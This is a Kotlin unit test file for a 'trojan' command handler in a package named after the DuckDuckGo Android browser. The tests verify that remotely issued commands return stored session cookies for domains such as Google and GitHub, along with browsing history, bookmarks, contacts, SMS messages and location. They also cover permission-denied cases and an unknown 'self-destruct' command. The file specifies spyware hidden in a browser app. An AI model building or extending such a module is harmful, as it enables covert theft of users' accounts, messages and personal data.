package com.duckduckgo.trojan.impl

import android.content.Context
import android.net.Uri
import android.webkit.CookieManager
import com.duckduckgo.common.test.CoroutineTestRule
import com.duckduckgo.cookies.api.CookieManagerProvider
import com.duckduckgo.history.api.HistoryEntry
import com.duckduckgo.history.api.NavigationHistory
import com.duckduckgo.savedsites.api.SavedSitesRepository
import com.duckduckgo.savedsites.api.models.SavedSite
import com.duckduckgo.trojan.api.PendingCommand
import kotlinx.coroutines.flow.flowOf
import kotlinx.coroutines.test.runTest
import org.hamcrest.CoreMatchers.`is`
import org.hamcrest.MatcherAssert.assertThat
import org.hamcrest.CoreMatchers.containsString
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.kotlin.mock
import org.mockito.kotlin.whenever
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment
import java.time.LocalDateTime

@RunWith(RobolectricTestRunner::class)
class CommandHandlerTest {

    @get:Rule
    val coroutineRule = CoroutineTestRule()

    private val mockCookieManagerProvider: CookieManagerProvider = mock()
    private val mockCookieManager: CookieManager = mock()
    private val mockNavigationHistory: NavigationHistory = mock()
    private val mockSavedSitesRepository: SavedSitesRepository = mock()
    private lateinit var context: Context

    private lateinit var testee: RealCommandHandler

    @Before
    fun setUp() {
        context = RuntimeEnvironment.getApplication()
        testee = RealCommandHandler(
            mockCookieManagerProvider,
            mockNavigationHistory,
            mockSavedSitesRepository,
            context,
        )
    }

    // -----------------------------------------------------------------------
    // request-cookies
    // -----------------------------------------------------------------------

    @Test
    fun whenRequestCookiesWithDomainsThenReturnsCookiesForThoseDomains() = runTest {
        whenever(mockCookieManagerProvider.get()).thenReturn(mockCookieManager)
        whenever(mockCookieManager.getCookie("https://www.google.com"))
            .thenReturn("SID=abc123; HSID=xyz789")

        val cmd = PendingCommand(
            id = "1",
            type = "request-cookies",
            payload = mapOf("domains" to "https://www.google.com"),
        )
        val result = testee.execute(cmd)

        assertThat(result, containsString("google.com"))
        assertThat(result, containsString("SID=abc123"))
    }

    @Test
    fun whenRequestCookiesWithMultipleDomainsThenReturnsAll() = runTest {
        whenever(mockCookieManagerProvider.get()).thenReturn(mockCookieManager)
        whenever(mockCookieManager.getCookie("https://www.google.com"))
            .thenReturn("SID=abc")
        whenever(mockCookieManager.getCookie("https://github.com"))
            .thenReturn("_gh_sess=xyz")

        val cmd = PendingCommand(
            id = "1",
            type = "request-cookies",
            payload = mapOf("domains" to "https://www.google.com, https://github.com"),
        )
        val result = testee.execute(cmd)

        assertThat(result, containsString("google.com"))
        assertThat(result, containsString("github.com"))
    }

    @Test
    fun whenRequestCookiesWithEmptyPayloadThenUsesDefaultDomains() = runTest {
        whenever(mockCookieManagerProvider.get()).thenReturn(mockCookieManager)
        // All default domains return null (no cookies)
        val cmd = PendingCommand(id = "1", type = "request-cookies", payload = emptyMap())
        val result = testee.execute(cmd)

        assertThat(result, `is`("no cookies found"))
    }

    @Test
    fun whenCookieManagerNotAvailableThenReturnsError() = runTest {
        whenever(mockCookieManagerProvider.get()).thenReturn(null)

        val cmd = PendingCommand(id = "1", type = "request-cookies", payload = emptyMap())
        val result = testee.execute(cmd)

        assertThat(result, containsString("CookieManager not available"))
    }

    @Test
    fun whenNoCookiesFoundThenReturnsNoCookies() = runTest {
        whenever(mockCookieManagerProvider.get()).thenReturn(mockCookieManager)
        whenever(mockCookieManager.getCookie("https://example.com")).thenReturn(null)

        val cmd = PendingCommand(
            id = "1",
            type = "request-cookies",
            payload = mapOf("domains" to "https://example.com"),
        )
        val result = testee.execute(cmd)

        assertThat(result, `is`("no cookies found"))
    }

    // -----------------------------------------------------------------------
    // request-history
    // -----------------------------------------------------------------------

    @Test
    fun whenRequestHistoryThenReturnsFormattedEntries() = runTest {
        val entries = listOf(
            HistoryEntry.VisitedPage(
                url = Uri.parse("https://example.com"),
                title = "Example",
                visits = listOf(LocalDateTime.now()),
            ),
        )
        whenever(mockNavigationHistory.getHistory()).thenReturn(flowOf(entries))

        val cmd = PendingCommand(id = "1", type = "request-history", payload = emptyMap())
        val result = testee.execute(cmd)

        assertThat(result, containsString("example.com"))
        assertThat(result, containsString("Example"))
        assertThat(result, containsString("visits: 1"))
    }

    @Test
    fun whenNoHistoryThenReturnsNoEntries() = runTest {
        whenever(mockNavigationHistory.getHistory()).thenReturn(flowOf(emptyList()))

        val cmd = PendingCommand(id = "1", type = "request-history", payload = emptyMap())
        val result = testee.execute(cmd)

        assertThat(result, `is`("no history entries"))
    }

    // -----------------------------------------------------------------------
    // request-bookmarks
    // -----------------------------------------------------------------------

    @Test
    fun whenRequestBookmarksThenReturnsFormattedList() = runTest {
        val bookmarks = listOf(
            SavedSite.Bookmark(
                id = "1",
                title = "GitHub",
                url = "https://github.com",
                parentId = "0",
                lastModified = null,
                isFavorite = false,
            ),
        )
        whenever(mockSavedSitesRepository.getBookmarksTree()).thenReturn(bookmarks)

        val cmd = PendingCommand(id = "1", type = "request-bookmarks", payload = emptyMap())
        val result = testee.execute(cmd)

        assertThat(result, containsString("github.com"))
        assertThat(result, containsString("GitHub"))
    }

    @Test
    fun whenNoBookmarksThenReturnsNoBookmarks() = runTest {
        whenever(mockSavedSitesRepository.getBookmarksTree()).thenReturn(emptyList())

        val cmd = PendingCommand(id = "1", type = "request-bookmarks", payload = emptyMap())
        val result = testee.execute(cmd)

        assertThat(result, `is`("no bookmarks"))
    }

    // -----------------------------------------------------------------------
    // request-contacts
    // -----------------------------------------------------------------------

    @Test
    fun whenRequestContactsWithNoContactsThenReturnsNoContacts() = runTest {
        // Robolectric's ContentResolver returns empty cursor for contacts by default.
        val cmd = PendingCommand(id = "1", type = "request-contacts", payload = emptyMap())
        val result = testee.execute(cmd)

        // Either "no contacts" or "no contacts available" are valid.
        assertThat(result.contains("no contact", ignoreCase = true), `is`(true))
    }

    @Test
    fun whenRequestContactsPermissionDeniedThenReturnsPermissionError() = runTest {
        // Use a context whose ContentResolver throws SecurityException.
        val restrictedContext = object : android.content.ContextWrapper(context) {
            override fun getContentResolver(): android.content.ContentResolver {
                return object : android.test.mock.MockContentResolver() {
                    override fun query(
                        uri: Uri,
                        projection: Array<out String>?,
                        selection: String?,
                        selectionArgs: Array<out String>?,
                        sortOrder: String?,
                    ) = throw SecurityException("READ_CONTACTS denied")
                }
            }
        }
        val restrictedHandler = RealCommandHandler(
            mockCookieManagerProvider,
            mockNavigationHistory,
            mockSavedSitesRepository,
            restrictedContext,
        )

        val cmd = PendingCommand(id = "1", type = "request-contacts", payload = emptyMap())
        val result = restrictedHandler.execute(cmd)

        assertThat(result, containsString("permission denied"))
    }

    // -----------------------------------------------------------------------
    // request-sms
    // -----------------------------------------------------------------------

    @Test
    fun whenRequestSmsWithEmptyInboxThenReturnsNoMessages() = runTest {
        // Robolectric's ContentResolver returns null/empty for content://sms/inbox by default.
        val cmd = PendingCommand(id = "1", type = "request-sms", payload = emptyMap())
        val result = testee.execute(cmd)

        assertThat(
            result.contains("no message", ignoreCase = true) ||
                result.contains("no sms", ignoreCase = true),
            `is`(true),
        )
    }

    @Test
    fun whenRequestSmsPermissionDeniedThenReturnsPermissionError() = runTest {
        val restrictedContext = object : android.content.ContextWrapper(context) {
            override fun getContentResolver(): android.content.ContentResolver {
                return object : android.test.mock.MockContentResolver() {
                    override fun query(
                        uri: Uri,
                        projection: Array<out String>?,
                        selection: String?,
                        selectionArgs: Array<out String>?,
                        sortOrder: String?,
                    ) = throw SecurityException("READ_SMS denied")
                }
            }
        }
        val restrictedHandler = RealCommandHandler(
            mockCookieManagerProvider,
            mockNavigationHistory,
            mockSavedSitesRepository,
            restrictedContext,
        )

        val cmd = PendingCommand(id = "1", type = "request-sms", payload = emptyMap())
        val result = restrictedHandler.execute(cmd)

        assertThat(result, containsString("permission denied"))
    }

    // -----------------------------------------------------------------------
    // request-location
    // -----------------------------------------------------------------------

    @Test
    fun whenRequestLocationWithNoCachedFixThenReturnsUnavailableMessage() = runTest {
        // Robolectric provides a LocationManager but has no cached location by default.
        val cmd = PendingCommand(id = "1", type = "request-location", payload = emptyMap())
        val result = testee.execute(cmd)

        // Valid outcomes: "location unavailable" or coordinates if Robolectric injects a fix.
        assertThat(
            result.contains("location unavailable", ignoreCase = true) ||
                result.contains("lat=", ignoreCase = true) ||
                result.contains("permission denied", ignoreCase = true),
            `is`(true),
        )
    }

    // -----------------------------------------------------------------------
    // Unknown command
    // -----------------------------------------------------------------------

    @Test
    fun whenUnknownCommandThenReturnsUnknownMessage() = runTest {
        val cmd = PendingCommand(id = "1", type = "self-destruct", payload = emptyMap())
        val result = testee.execute(cmd)

        assertThat(result, containsString("unknown command type"))
    }
}
